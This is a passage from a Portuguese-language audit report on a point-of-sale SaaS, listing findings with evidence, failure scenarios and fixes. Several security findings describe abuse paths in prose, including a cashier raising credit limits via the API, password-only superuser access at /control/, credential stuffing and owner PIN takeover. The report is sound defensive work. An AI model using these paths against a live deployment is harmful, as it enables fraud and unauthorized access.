- **Evidência:** RESOURCE['customers'] usa write_roles = CONTACT_WRITE | {'cashier'} (l.22) e form_values aceita 'credit_limit_cents' para customers sem checar papel (l.88-90, 115-116). O painel confirma: resourceSpecs.customers edit: can('owner','admin','manager','cashier') com o campo 'Limite de fiado (R$)' (web/assets/app.js:514-520). No terminal, só fiado acima do limite pede PIN (terminal/store.py:1219-1221).
- **Cenário de falha:** Caixa entra no painel web com o próprio e-mail/senha (todo membro é criado com login), faz PATCH /api/v1/customers/<id> {credit_limit_cents: 5000000} para um conhecido; no próximo bootstrap o terminal recebe o novo limite e a venda a prazo passa sem PIN de gerente. A auditoria grava só 'customers.updated' com fields=['credit_limit_cents'], sem o valor antigo/novo.
- **Correção:** Restringir credit_limit_cents (e active) a owner/admin/manager em form_values (rejeitar o campo quando member.role == 'cashier'), esconder o campo no painel para caixa e gravar valor anterior e novo no AuditEvent.

### Troca de plano feita no admin SaaS não altera a cobrança no Asaas e é desfeita no próximo pagamento; não existe caminho de upgrade/downgrade para quem já paga

- **Onde:** `operations/services.py:97` · área `planos-permissoes-matriz` · categoria `money` · confirmado
- **Evidência:** subscription_detail PATCH troca row.plan localmente (cloud/core/views_platform.py:311-342) sem tocar em BillingBinding. reconcile_payment, a cada fatura paga, faz 'sub.plan=binding.plan' (services.py:93-100) e BillingBinding.plan/amount_cents nunca são atualizados em nenhum ponto do repositório. O autoatendimento bloqueia: 'Já há assinatura no provedor; solicite alteração à plataforma' (operations/views.py:161-162).
- **Cenário de falha:** Cliente no Essencial (R$ 149) pede upgrade para Gestão. O financeiro edita a assinatura no painel: o cliente ganha Financeiro/Relatórios pagando R$ 149; na renovação seguinte o webhook pago devolve o plano para Essencial e os módulos somem (403 'Recurso não incluído no plano'). No sentido inverso (downgrade combinado), o Asaas continua cobrando o valor antigo e o plano volta ao mais caro.
- **Correção:** Criar fluxo de troca de plano: atualizar valor/ciclo da assinatura no Asaas (ou cancelar e recriar com pró-rata), atualizar BillingBinding.plan e amount_cents na mesma transação, e fazer reconcile_payment respeitar o plano vigente. Enquanto não existir, bloquear plan_id no PATCH quando houver binding ativo.

### Django admin em /control/ aceita login só com senha para superusuário, contornando a MFA da plataforma, sem limite de tentativas e sem auditoria

- **Onde:** `cloud/pdvcloud/urls.py:27` · área `planos-permissoes-matriz` · categoria `security` · confirmado
- **Evidência:** path('control/', admin.site.urls) (urls.py:27). A MFA só é exigida em login_view/platform_user (views_auth.py:178, api_common.py:180); o login do admin do Django não passa por take_rate nem por MFA. cloud/core/admin.py:17-52 registra Plan, Tenant, Subscription, Terminal, Membership, FinanceEntry, BillingInvoice, FiscalDocument, Product, Customer como editáveis.
- **Cenário de falha:** Com a senha do superusuário (vazada ou por força bruta, pois /control/login não tem throttle), o atacante entra sem TOTP e edita Subscription (status active, período até 2099), Membership.role (vira owner de qualquer empresa e lê todos os dados via API de empresa) ou Plan.features. Nenhuma dessas mudanças gera AuditEvent nem passa pelas checagens de limite. Se features for salvo como objeto/texto, sign_lease falha (shared/licensing.py:63-65) e todos os terminais do plano param de renovar a licença.
- **Correção:** Remover /control/ de produção ou protegê-lo com a mesma MFA (middleware que exige session['platform_mfa_verified'] para /control/), aplicar rate limit no login e tornar Plan/Subscription/Membership somente leitura no admin.

### Diálogos de devolução, de recebimento de fiado e de variação herdam a grade de 2 colunas do .confirm-dialog e renderizam quebrados

- **Onde:** `terminal/static/terminal.css:224` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** `.confirm-dialog{display:grid;grid-template-columns:auto 1fr}` (linha 8) e `.return-dialog{...display:grid;gap:12px}` (linha 224) / `.variant-dialog` (linha 234) não redefinem as colunas. terminal.js:208 e :248 criam `confirm-dialog return-dialog` com filhos soltos (confirm-copy, return-lines, labels). Reproduzi as regras exatas num navegador: devolução = colunas `486.8px 9.2px` (a lista `.return-lines` com os campos de quantidade fica com 9px de largura e overflow:auto; o campo Motivo vaza para fora); fiado = colunas `496px 0px` (os selects Cliente e Forma ficam com 0px e aparecem como um toco de 48px sobre o fundo escuro, fora do cartão branco).
- **Cenário de falha:** Gerente abre Vendas > Devolver: não enxerga os itens nem o campo de quantidade devolvida, só o título e 'Como devolver o valor'. Operador clica em 'Receber fiado de cliente': o seletor de cliente aparece cortado ('Mar…') fora do diálogo; ele confirma o recebimento no primeiro devedor da lista e em 'Dinheiro' sem perceber, baixando a dívida do cliente errado e gerando diferença no caixa. No seletor de variação o título ocupa a coluna esquerda e a grade de tamanhos fica espremida (227px/346px no teste; uma coluna só com nome longo).
- **Correção:** Adicionar `.return-dialog,.variant-dialog{grid-template-columns:minmax(0,1fr)}` e estilos de campo (`.return-dialog input,.return-dialog select{width:100%;height:42px;border:1px solid #d7e2e3;border-radius:10px;padding:8px 11px}`). Aproveitar para registrar esses diálogos em `activeConfirm` (hoje não registram, então F2 e a captura do leitor continuam agindo na tela de trás) e fechar com Esc.

### Em monitor de 1024px, 'Bloquear caixa' e 'Sair' ficam fora da tela para proprietário, administrador e gerente, sem rolagem possível

- **Onde:** `terminal/static/terminal.css:54` · área `layout-marca-landing` · categoria `security` · confirmado
- **Evidência:** Linhas 53-62: `html,body{overflow:hidden}`, `.topbar{flex-wrap:nowrap}`, `.top-nav{flex:none}`, `.operator{min-width:max-content}`, `.brand{min-width:208px}`. Medido a 1024x768 com as 5 abas (perfis de canManage, terminal.js:3/200) e o rótulo 'Maria Souza · Operador de caixa': `.operator` começa em x=794 e termina em x=1219; 'Fechar caixa' em 978-1070 (cortado), 'Bloquear caixa' em x=1076 e 'Sair' em x=1181. O topo só passa a quebrar linha em <=980px (linha 80). Só os botões já somam 247px e sobram ~210px, então 'Sair' nunca cabe para esses perfis nessa largura.
- **Cenário de falha:** Loja com monitor touch de 15" (1024x768, o padrão de PDV). O gerente entra para autorizar uma devolução e não consegue tocar em 'Sair' nem em 'Bloquear caixa'. O caixa segue logado com o PIN do gerente: desconto, remoção de item e devolução passam a não pedir autorização para quem estiver no balcão.
- **Correção:** Trocar os três botões por um menu do operador (avatar + nome abre Fechar caixa / Bloquear / Sair) ou permitir quebra do topo até 1250px. Abaixo de 1250px reduzir as abas a ícone com tooltip. Testar 1024x768 e 1366x768 com os três perfis antes de liberar.

### Em telas de 768px de altura a lista do carrinho fica com 120px (1 item inteiro), as categorias aparecem cortadas e o botão de finalizar some abaixo da dobra quando o navegador não está em tela cheia

- **Onde:** `terminal/static/terminal.css:74` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** `.cart-items{min-height:120px;...overflow:auto}` (linha 74) disputa altura com blocos fixos: título 'Frente de caixa' + subtítulo (114px, index.html:68), total (linha 175), campo de desconto sempre visível (index.html:88), rodapé e `.legal-note` (index.html:113-114). `.categories` tem overflow:auto e encolhe como item flex. Medido com 8 itens no carrinho: 1366x768 e 1024x768 em tela cheia = lista com 120px, 1 linha inteira visível, carrinho com 570px de conteúdo para 557px, faixa de categorias com 34-37px para 52px naturais (chips cortados ao meio), 4 e 2 produtos inteiros no catálogo. Em 1366x650 e 1024x650 (navegador com abas e barra de endereço): área do carrinho de 439px e botão 'Revisar e confirmar venda' em y=644, fora da área visível (termina em ~627); nenhum card de produto inteiro.
- **Cenário de falha:** Mercearia com notebook ou monitor 1366x768: o operador passa 8 produtos e vê 1 item e meio por vez numa janelinha rolável, sem conseguir conferir o pedido com o cliente. Se o Chrome não estiver em modo quiosque, precisa rolar o cartão do carrinho para achar o botão de finalizar a cada venda.
- **Correção:** No caixa, remover o bloco de título (eyebrow/H1/subtítulo) e levar o chip 'Caixa aberto' para o topo; transformar o desconto em botão/atalho que abre diálogo; tirar a `.legal-note` do carrinho; `.categories{flex:none}`; reduzir paddings em `@media (max-height:800px)`. Meta: pelo menos 5 linhas do carrinho visíveis em 1366x768 com total e botão de finalizar sempre fixos no rodapé do cartão.

### App iOS soma fiado e crédito de loja em 'Recebimentos'

- **Onde:** `ios/PDV2OwnerMonitor/PDV2OwnerMonitor/OwnerDashboardView.swift:124` · área `layout-marca-landing` · categoria `money` · confirmado
- **Evidência:** `let received = cash + pix + cardCredit + cardDebit + other` (linha 124). No servidor, `_payment_totals` (cloud/core/views_owner.py:28-41) joga em 'other' todo método fora de cash/pix/card_credit/card_debit, e SalePayment aceita `credit_account` e `store_credit` (cloud/core/models.py:311). O cartão de detalhamento (linhas 134-139) lista só Dinheiro, Pix, Crédito e Débito.
- **Cenário de falha:** Loja vende R$ 1.000 no dia, sendo R$ 300 no fiado. O proprietário abre o app e vê 'Recebimentos R$ 1.000,00' com seta verde, mas só entraram R$ 700; as quatro barras abaixo somam R$ 700 e não fecham com o cartão. Como fiado é o recurso mais divulgado na landing para mercearias, o erro aparece todo dia.
- **Correção:** No endpoint devolver `credit_account` e `store_credit` em chaves próprias (manter 'other' só para o resto). No app: recebido = dinheiro + Pix + crédito + débito; mostrar 'A prazo (fiado)' e 'Crédito de loja' em linhas separadas, fora do total recebido.

### App iOS abre apontando para http://127.0.0.1:8000 e expõe 'URL da API' ao cliente final; a landing anuncia o app sem link de download

- **Onde:** `ios/PDV2OwnerMonitor/PDV2OwnerMonitor/RootView.swift:88` · área `layout-marca-landing` · categoria `ux-bug` · confirmado
- **Evidência:** AppSession.swift:22 `?? "http://127.0.0.1:8000"`; RootView.swift:86-104 mostra 'Configuração do servidor' com `TextField("URL da API")` e o texto 'Simulador: http://127.0.0.1:8000 • Produção: domínio HTTPS'. APIClient.swift:93-94 converte qualquer falha de rede em 'Sem conexão com o servidor.'. web/landing.html:145 mostra 'App Store · Aplicativo para iPhone' num `<div>` sem link e a FAQ (linha 217) responde 'Sim' para acompanhar pelo celular; docs/STATUS-V2.md registra que a publicação nas lojas ainda não existe.
- **Cenário de falha:** Proprietário instala o app num iPhone real, digita e-mail e senha corretos e recebe 'Sem conexão com o servidor.' em todas as tentativas, porque 127.0.0.1 é o próprio telefone. Para entrar precisa descobrir o item recolhido e digitar um endereço que ninguém informou. Antes disso, quem lê a landing procura o app e não encontra onde baixar.
- **Correção:** Fixar a URL de produção por configuração de build (xcconfig/Info.plist) e exibir o campo só em DEBUG. Diferenciar erro de rede de servidor inacessível. Na landing, trocar o selo por 'Em breve' até existir link real da App Store.

### Assinatura editável no admin concede licença paga sem Asaas, sem AuditEvent e pode sobrescrever um pagamento recém-conciliado

- **Onde:** `cloud/core/admin.py:29` · área `admin-django-migracoes-dados` · categoria `money` · confirmado
- **Evidência:** `SubscriptionAdmin` só define list_display/list_filter: tenant, plan, status, license_source, trial_ends_at, current_period_end e external_id ficam editáveis. A API força `license_source = "manual"`, exige período ao ativar e audita (views_platform.py:334-343); o VIP exige superusuário, verificação de cobrança pausada no Asaas e auditoria (views_platform.py:351-416). O form do admin grava TODOS os campos carregados, sem select_for_update.
- **Cenário de falha:** 1) No admin, status=active, current_period_end=2036 e license_source='subscription': a empresa usa o plano 10 anos sem pagar, entra no MRR (`active.filter(license_source='subscription')`, operations/views.py:311) e nada aparece em /api/v1/platform/audit. 2) Staff abre a assinatura para estender um trial; enquanto o form está aberto o worker confirma o pagamento (operations/services.py:97-100 grava active + novo período); ao salvar, o admin regrava status/período antigos e o cliente que pagou perde a licença após a carência. 3) status=active com current_period_end vazio bloqueia a empresa na hora ('Assinatura sem período de cobrança', api_common.py:155). 4) Trocar `tenant` move a assinatura para outra empresa.
- **Correção:** Registrar Subscription com ReadOnlyAdmin e deixar alterações só pelas rotas /api/v1/platform/subscriptions (auditadas e com lock). Se for preciso editar no admin, limitar a `trial_ends_at`, usar `save_model` com select_for_update + update_fields e gravar AuditEvent.

### Fiado (FinanceEntry) pode ser alterado, liquidado ou excluído em massa pelo admin sem rastro de negócio

- **Onde:** `cloud/core/admin.py:50` · área `admin-django-migracoes-dados` · categoria `money` · confirmado
- **Evidência:** `admin.site.register(model)` para FinanceEntry (linhas 49-52) usa ModelAdmin padrão: todos os campos editáveis e ação 'excluir selecionados' ativa, listando títulos de todas as empresas juntos. A API proíbe alterar valor/cliente/loja de fiado gerado por venda (views_finance.py:75-76) e liquida com lock + auditoria (views_finance.py:109-127). O saldo de fiado é a soma dos títulos `status="open"` com venda (credit_logic.py:30).
- **Cenário de falha:** Staff muda status para 'settled'/'cancelled', reduz amount_cents ou exclui o título de um cliente: a dívida some do extrato e do limite de crédito enviado ao terminal (views_terminal.py:298-301) sem CreditReceipt, sem entrada no caixa e sem AuditEvent; o lojista perde o valor a receber. Com 'selecionar todos' + excluir na lista, apagam-se de uma vez títulos em aberto de várias empresas (só os ligados a Commission são protegidos por PROTECT); a recuperação depende do backup horário.
- **Correção:** Trocar FinanceEntry, BillingInvoice, StockReceipt e FiscalDocument para ReadOnlyAdmin (como já é feito para Sale/StockMovement nas linhas 55-58) e, onde a edição for necessária, definir `actions = None`, `has_delete_permission=False` e gravar AuditEvent em `save_model`.

### Campos sem validação no admin (Plan.features, Tenant.max_discount_bps) fazem a assinatura da licença falhar e derrubam a renovação dos terminais

- **Onde:** `cloud/core/admin.py:17` · área `admin-django-migracoes-dados` · categoria `correctness` · confirmado
- **Evidência:** PlanAdmin e TenantAdmin (linhas 17-26) expõem `features` (JSON livre) e `max_discount_bps` (inteiro positivo sem teto). `_lease` copia ambos para a licença (views_terminal.py:93-94) e `sign_lease` chama `_validate_claims`, que exige lista de strings de até 80 caracteres e desconto de 0 a 10000 (shared/licensing.py:63-68). A exceção vira 503 'Chaves de licença indisponíveis' (views_terminal.py:100-101). A API valida esses campos (views_platform.py:246-248; operations/views.py:67-71).
- **Cenário de falha:** Staff edita o plano Essencial em /control/ e salva features como `{"finance": true}` ou como texto: todo bootstrap/pareamento de TODAS as empresas desse plano passa a responder 503. As licenças offline não são renovadas e, em até 72h (24h para past_due), todos os caixas do plano param de vender, com uma mensagem que aponta para chaves e não para o plano. O mesmo acontece com uma única empresa se max_discount_bps for salvo acima de 10000.
- **Correção:** Colocar validadores no modelo (`validators` em max_discount_bps; função `clean` que exija lista de strings em Plan.features) para valerem também no admin, ou tornar esses campos readonly no admin. Em `_lease`, registrar em log o motivo real do LicenseError.

### Membership e demais cadastros permitem trocar empresa/usuário/papel e criar vínculos entre empresas sem validação nem auditoria

- **Onde:** `cloud/core/admin.py:42` · área `admin-django-migracoes-dados` · categoria `security` · confirmado
- **Evidência:** MembershipAdmin (42-46) só exclui pin_hash; tenant, user, role e active ficam editáveis. Shop, Category, Product, Customer, Supplier e StockReceipt usam o ModelAdmin padrão (49-52) com o FK `tenant` editável. Só Plan, Tenant e PlatformMFA têm `__str__` (models.py:30, 67, 754), então os seletores mostram 'Category object (uuid)' de todas as empresas misturadas. A API protege o último proprietário, restringe quem mexe em owner e audita (views_users.py:26-31, 103-115).
- **Cenário de falha:** a) Staff troca `user` ou `tenant` de um Membership (ou cria um): outra pessoa vira owner/admin de uma empresa que não é dela, e o PIN (pin_hash mantido) passa a valer nos caixas da empresa de destino; nada entra em AuditEvent. b) Desativar ou rebaixar o único owner deixa a empresa sem ninguém capaz de gerir usuários e terminais. c) Ao editar um produto, escolher uma categoria de outra empresa (impossível distinguir no seletor) grava vínculo cruzado: o nome da categoria alheia vai para o catálogo do terminal (views_terminal.py:289). d) Trocar `tenant` de Product/Customer/Shop desloca cadastro com vendas e estoque para outra empresa.
- **Correção:** Tornar `tenant` e `user` readonly após a criação, usar `raw_id_fields`/autocomplete filtrados pela empresa do registro, validar em `clean()` que todo FK pertence ao mesmo tenant, aplicar a regra do último owner e gravar AuditEvent. Definir `__str__` com nome + empresa nos modelos.

### No Windows, toda venda falha com erro 500: ZoneInfo('America/Sao_Paulo') sem tzdata lança exceção não capturada dentro da transação da venda (não cai no fallback de data)

- **Onde:** `terminal/printers.py:92` · área `testes-ci-distribuicao` · categoria `correctness` · confirmado
- **Evidência:** _receipt_date faz `datetime.fromtimestamp(value / 1000, ZoneInfo("America/Sao_Paulo"))` e só captura `(TypeError, ValueError, OverflowError, OSError)` (l.90-97). ZoneInfoNotFoundError herda de KeyError (confirmado no MRO), então escapa. terminal/requirements.txt lista só Flask, waitress, cryptography, requests e pywin32; nenhuma dessas traz tzdata e o Python do Windows não tem base de fusos. store.sale chama `return self._receipt_data(conn, snapshot)` (store.py:1261) -> receipt_layout -> _receipt_date (printers.py:159) ainda dentro de `with self.transaction()`. O único tratador de erro do Flask é para TerminalError (app.py:93).
- **Cenário de falha:** Loja instala pelo install-windows.ps1 (caminho recomendado em docs/DEPLOY-DOKPLOY.md para impressora USB). Operador fecha a primeira venda: ZoneInfoNotFoundError -> rollback da transação -> HTTP 500. Nenhuma venda, reimpressão, cancelamento ou devolução (todas passam por receipt_layout) conclui. O teste test_receipts.py:34 valida a data, mas o CI só roda em ubuntu-latest com o requirements.txt da raiz, então nunca pegaria.
- **Correção:** Adicionar `tzdata==<versão>; platform_system == "Windows"` em terminal/requirements.txt; em _receipt_date capturar também KeyError e usar fallback fixo `timezone(timedelta(hours=-3))` (Brasil sem horário de verão desde 2019); montar o layout do comprovante fora do caminho crítico (falha de renderização não pode desfazer a venda); criar job `windows-latest` no CI que instala apenas terminal/requirements.txt e roda terminal/tests.

### certifi fixado em versão com alerta crítico (GHSA-6q48-6c7w-9gw2) e o CI não tem auditoria de dependências

- **Onde:** `requirements.txt:3` · área `testes-ci-distribuicao` · categoria `security` · confirmado
- **Evidência:** `certifi==2026.7.22`. Consulta à base pública OSV feita nesta auditoria retornou GHSA-6q48-6c7w-9gw2 / PYSEC-2026-4320 (severidade CRITICAL): versões anteriores a 2026.10.18 confiam em raiz emSign cujas intermediárias tiveram chave comprometida; correção em 2026.10.19. As outras 26 dependências fixadas não retornaram alerta. O ci-v2.yml (l.30-40) só faz `pip install`, testes e docker build: sem pip-audit, sem Dependabot.
- **Cenário de falha:** As imagens cloud e terminal (ambas instalam o requirements.txt da raiz) usam esse pacote de CAs em todo `requests`: terminal -> nuvem (token Bearer do caixa e vendas, terminal/sync.py:47) e nuvem -> Asaas/Focus NFe (tokens dos provedores). Um atacante no caminho de rede com uma das chaves comprometidas apresenta certificado aceito como válido e lê ou altera esse tráfego. O alerta existe há semanas e nada no pipeline avisou.
- **Correção:** Subir para `certifi>=2026.10.19`, reconstruir e reimplantar as imagens; adicionar passo `pip-audit -r requirements.txt -r terminal/requirements.txt` que falha o CI e ativar Dependabot (pip e github-actions) semanal.

### Os quatro defeitos já registrados da sincronização não têm teste de regressão, e a suíte da nuvem fixa como correto o comportamento que trava a fila

- **Onde:** `cloud/core/tests.py:404` · área `testes-ci-distribuicao` · categoria `correctness` · confirmado
- **Evidência:** (a) Fila travada por evento recusado: sync_once reenvia sempre os mesmos 50 (`store.pending_events(50)`, sync.py:136) e qualquer 4xx vira TerminalError (sync.py:142-148). Testes existentes só cobrem falha transitória (test_terminal.py:758-775, test_contract_cloud.py:120-133); tests.py:404-425, 524, 859-860 e 1139 afirmam que 400/403/404 rejeita o lote inteiro. (b) Devolução/estorno com 409: credit_logic.py:89 e sale_logic.py:198/213 recusam; só há teste do conflito return_exceeds_sold (tests.py:769, 1102). (c) Fechamento negativo: views_terminal.py:424-425 valida expected_cents com money() (>=0, api_common.py:82-85); testes só têm quebra de caixa com esperado positivo (tests.py:571, test_terminal.py:508-525). (d) Limites: nuvem aceita 1..200 itens (sale_logic.py:49) e corpo de 1 MB (api_common.py:48); store.sale não limita itens (store.py:1110-1112) e o lote não tem teto de bytes; nenhum teste com 201 itens nem resposta 413.
- **Cenário de falha:** Administrador reduz o teto de desconto enquanto um caixa está offline: a venda antiga volta 403 para sempre (sale_logic.py:100), o lote inteiro é recusado e todas as vendas seguintes daquele caixa param de chegar à nuvem; estoque, financeiro e fiado ficam congelados e só cirurgia manual no SQLite resolve. Quem corrigir isso não tem nenhum teste que diga se a correção funcionou ou se regrediu; o comentário em tests.py:505 mostra que essa classe de falha já ocorreu.
- **Correção:** Escrever no test_contract_cloud.py (terminal real contra a nuvem) um caso por achado: evento permanentemente recusado no meio do lote seguido de eventos válidos (esperado: quarentena do evento e avanço da fila); devolução após cancelamento e cancelamento após devolução; fechamento com esperado negativo; venda com 201 itens e lote acima de 1 MB. Trocar a asserção de 'lote inteiro 400' por aceitação por evento com lista de rejeitados.

### Erros internos em produção não deixam rastro: sem LOGGING, sem ADMINS e o worker de cobrança/fiscal engole a exceção sem registrar

- **Onde:** `operations/services.py:232` · área `testes-ci-distribuicao` · categoria `maintainability` · confirmado
- **Evidência:** run_one: `except Exception as exc: message=str(exc) if isinstance(exc,ValueError) else 'Falha interna ao executar tarefa; consulte o suporte'` e grava needs_review, sem logging (l.232-235). settings.py não define LOGGING nem ADMINS; o padrão do Django (conferido no .venv) envia o logger `django` só para `console` (filtro require_debug_true) e `mail_admins` (sem ADMINS não envia). O decorador endpoint só trata APIError (api_common.py:26-33). Em todo o código há um único uso de logging (worker.py:34) e nenhum send_mail, apesar do SMTP configurado (settings.py:123-129). needs_review e backup atrasado só aparecem se alguém abrir o painel (operations/views.py:299, views_backup.py:79-85).
- **Cenário de falha:** Asaas muda um campo e reconcile_payment lança KeyError: o cliente pagou, o job vai para needs_review com mensagem genérica, sem stack trace em lugar nenhum e sem aviso. A assinatura não renova, a licença do caixa vence e a loja pagante para de vender. O mesmo vale para um 500 em /api/v1/terminal/sync: o terminal recebe HTML, registra 'JSON inválido', a fila trava e o log da nuvem só mostra a linha de acesso do gunicorn.
- **Correção:** Definir LOGGING com handler de console em nível INFO para `django`, `django.request` e raiz (stdout já é coletado pelo json-file do compose); `logging.exception` em run_one antes de gravar needs_review; configurar ADMINS/SERVER_EMAIL ou Sentry; tarefa periódica no worker que envia e-mail quando houver job needs_review, backup em estado stale/error ou terminal com fila pendente há mais de N horas.

## Médio (118)

### Primeiro cadastro de MFA depende só da senha (dono promovido ao SaaS ou funcionário recém-criado)

- **Onde:** `cloud/core/views_auth.py:178` · área `cloud-auth-tenancy` · categoria `security` · confirmado
- **Evidência:** Em `login_view` (178-186), conta de plataforma sem `PlatformMFA.enabled` recebe `mfa_setup_required`; com a sessão pendente, `mfa_setup` (192-199) devolve o segredo TOTP e `mfa_setup_confirm` (227-255) ativa a MFA e conclui o login. `platform_user_detail` permite promover um proprietário de empresa a papéis SaaS (views_platform.py:128-148) sem invalidar a senha atual.
- **Cenário de falha:** A senha de um dono de loja já vazou (contas de empresa não têm MFA). O superusuário promove esse login a `platform_support`. Quem tem a senha entra primeiro, cadastra o TOTP no próprio aparelho e vira operador do SaaS com MFA "válida". O mesmo vale para a senha inicial de um funcionário novo enviada por mensagem.
- **Correção:** Na promoção/criação, gerar um código de ativação de uso único e curta validade, entregue por canal separado e exigido em `mfa_setup_confirm`; ou forçar troca de senha na promoção. Avisar o superusuário por auditoria/alerta quando uma MFA for ativada.

### Monitor do proprietário soma as vendas pela hora de chegada ao servidor, não pela hora da venda

- **Onde:** `cloud/core/views_owner.py:61` · área `cloud-auth-tenancy` · categoria `correctness` · confirmado
- **Evidência:** `Sale.objects.filter(tenant=tenant, status="completed", received_at__gte=start, received_at__lt=end)` (linhas 61-62). `received_at` é `auto_now_add` do servidor e `created_at` é a hora da venda no terminal (cloud/core/models.py:274-275). O dashboard web usa `created_at__date` (views_sales.py:115) e os relatórios também (views_reports.py:47).
- **Cenário de falha:** Loja fica sem internet à tarde e sincroniza na manhã seguinte. No app iOS, as vendas de ontem aparecem como faturamento de hoje (e ontem ficou subestimado), divergindo do painel web e do fechamento de caixa. Em um PDV offline-first isso acontece no uso normal.
- **Correção:** Filtrar e agregar por `created_at` (como o dashboard), mantendo `received_at` apenas para "última sincronização".

### Admin da empresa pode desativar um proprietário e redefinir o PIN dele

- **Onde:** `cloud/core/views_users.py:100` · área `cloud-auth-tenancy` · categoria `security` · confirmado
- **Evidência:** A proteção "Somente proprietário altera papel de proprietário" só roda dentro de `if "role" in data` (linhas 100-104). DELETE vira `{"active": False}` (linha 92) e `_last_owner` só barra o último dono (26-31). `user_pin` (119-136) aceita `roles=MANAGE` sem olhar o papel do alvo.
- **Cenário de falha:** Empresa com dois sócios `owner` e um gerente `admin`: o admin envia DELETE /users/<sócio> e tira o acesso de um dos donos ao painel e ao caixa. Ou envia POST /users/<dono>/pin com um PIN que ele conhece e passa a autorizar sangrias, cancelamentos e descontos no terminal registrados em nome do dono.
- **Correção:** Em `user_detail` e `user_pin`, se `row.role == "owner"` e `actor.role != "owner"`, recusar com 403 qualquer alteração (nome, ativo, comissão, PIN). Idealmente o PIN só é definido pelo próprio usuário ou por alguém de papel superior.

### E-mail é único no sistema inteiro e não há como vincular um login existente a outra empresa

- **Onde:** `cloud/core/views_users.py:70` · área `cloud-auth-tenancy` · categoria `correctness` · confirmado
- **Evidência:** `users` POST sempre cria um User novo e recusa com 409 se `User.objects.filter(email__iexact=email).exists()` (linhas 69-74); `register` faz o mesmo (views_auth.py:141). DELETE só desativa o Membership (linha 92), o User e o e-mail continuam reservados. O modelo, porém, é multiempresa (`Membership` N:N, `memberships_for`, cabeçalho X-Tenant-ID).
- **Cenário de falha:** Contador que atende duas lojas clientes, dono com dois CNPJs ou funcionário que saiu da loja A e foi contratado pela loja B: o cadastro devolve "E-mail já cadastrado" e a pessoa precisa inventar outro e-mail. De quebra, qualquer admin (ou o /auth/register sem login) descobre se um e-mail é cliente do SaaS.
- **Correção:** Criar fluxo de convite: se o e-mail já existe, criar apenas o Membership pendente e pedir aceite ao usuário logado (sem pedir senha ao admin). Resposta neutra para não revelar existência do e-mail.

### Limite de tentativas de login só por (IP, e-mail) e tabela de throttle nunca é limpa

- **Onde:** `cloud/core/views_auth.py:173` · área `cloud-auth-tenancy` · categoria `security` · confirmado
- **Evidência:** `take_rate(f"login:{client}:{email}", 5, 900)` (linha 173): não há contador por IP nem por conta. Em api_common.py:229-247 cada chave vira uma linha `RateLimit` que só é apagada por `reset_rate` no sucesso; nenhum outro ponto do código remove linhas expiradas (grep de `RateLimit` em cloud/ e operations/).
- **Cenário de falha:** Um único IP testa uma lista vazada de e-mail:senha com 1 tentativa por e-mail, sem nunca ser barrado (credential stuffing). Uma botnet testa a mesma conta a partir de muitos IPs sem bloqueio da conta. Cada e-mail inventado deixa uma linha permanente no PostgreSQL, que cresce sem limite.
- **Correção:** Somar um limite por IP (ex.: 30 falhas/15 min) e um por conta (ex.: 20 falhas/hora, com atraso progressivo), e apagar linhas com `expires_at` vencido no worker.

### Cancelar/editar a conta a pagar de comissão deixa as comissões como 'paid' para sempre

- **Onde:** `cloud/core/views_finance.py:68` · área `cloud-vendas-dinheiro` · categoria `money` · confirmado
- **Evidência:** commission_logic.pay cria um FinanceEntry payable e faz `Commission...update(status="paid", paid_at=now, finance_entry=entry)` (commission_logic.py:65-70). finance_detail permite DELETE (status='cancelled') e PATCH de amount_cents em qualquer título aberto sem `sale_id` (views_finance.py:66-76) e nada reverte as Commission vinculadas (finance_entry só é referenciado em views_commissions.py).
- **Cenário de falha:** Financeiro fecha comissões de um vendedor (R$ 1.200, 40 vendas) com vencimento errado e exclui o título para refazer. As 40 comissões continuam 'paid' apontando para um título cancelado; commission_pay responde 'Não há comissão positiva pendente'. O vendedor fica sem receber e o relatório mostra R$ 1.200 pagos que nunca saíram. O inverso também ocorre: editar o valor do título para menos sem alterar as comissões.
- **Correção:** Em finance_detail, se existir Commission com finance_entry=row: no DELETE, dentro da mesma transação, voltar essas comissões para status='pending', paid_at=None, finance_entry=None; no PATCH, bloquear amount_cents. Alternativamente bloquear a exclusão e oferecer 'desfazer fechamento de comissão'.

### Estorno de comissão em devolução parcial usa proporção do total da venda, ignorando a taxa por categoria de cada item

- **Onde:** `cloud/core/credit_logic.py:174` · área `cloud-vendas-dinheiro` · categoria `money` · confirmado
- **Evidência:** `share = int((Decimal(commission.amount_cents) * v["total"] / sale.total_cents).quantize(...))`, enquanto a apuração é por linha com taxa da categoria ou do vendedor e só entra na base a linha com taxa > 0 (commission_logic.py:25-30).
- **Cenário de falha:** Venda de R$ 1.000: item A R$ 900 em categoria com 10% (comissão R$ 90) e item B R$ 100 em categoria com 0%. Cliente devolve A: estorno = 90 x 900/1000 = R$ 81; o vendedor mantém R$ 9 de comissão sobre um item totalmente devolvido. Se devolver B, são descontados R$ 9 de comissão de um item que nunca gerou comissão. Em lojas de moda com taxas por categoria isso acontece em toda devolução parcial.
- **Correção:** Calcular o estorno por item devolvido: para cada (produto, qty) da devolução, aplicar a mesma taxa usada em accrue sobre return_line_amount; idealmente gravar a taxa/commission_cents em SaleItem no momento da venda e estornar a partir desse snapshot, limitando o acumulado ao valor da comissão original.

### Painel inicial soma faturamento sem descontar devoluções parciais

- **Onde:** `cloud/core/views_sales.py:115` · área `cloud-vendas-dinheiro` · categoria `correctness` · confirmado
- **Evidência:** `sales = Sale.objects.filter(tenant=tenant, status="completed", ...)`; `values = sales.aggregate(count=Count("id"), revenue=Sum("total_cents"))` e nenhum uso de SaleReturn no dashboard. Os relatórios descontam (`net = r["total"] - back` em views_reports.py:56-70).
- **Cenário de falha:** Loja vende R$ 10.000 no mês e recebe R$ 1.500 em devoluções parciais (a venda continua 'completed'). O dashboard mostra faturamento de R$ 10.000 e ticket médio inflado; o relatório de vendas por dia mostra líquido de R$ 8.500. O dono vê dois números diferentes para o mesmo período.
- **Correção:** No dashboard, subtrair `SaleReturn.objects.filter(tenant, sale__status='completed', created_at no período[, shop]).aggregate(Sum('total_cents'))` de revenue (ou expor `returns_cents` e `net_revenue_cents`) e calcular o ticket médio sobre o líquido.

### Limites da nuvem que o terminal não aplica (200 itens por venda, corpo de 1 MB por lote fixo de 50) geram evento que nunca sincroniza

- **Onde:** `cloud/core/sale_logic.py:49` · área `cloud-vendas-dinheiro` · categoria `data-loss` · confirmado
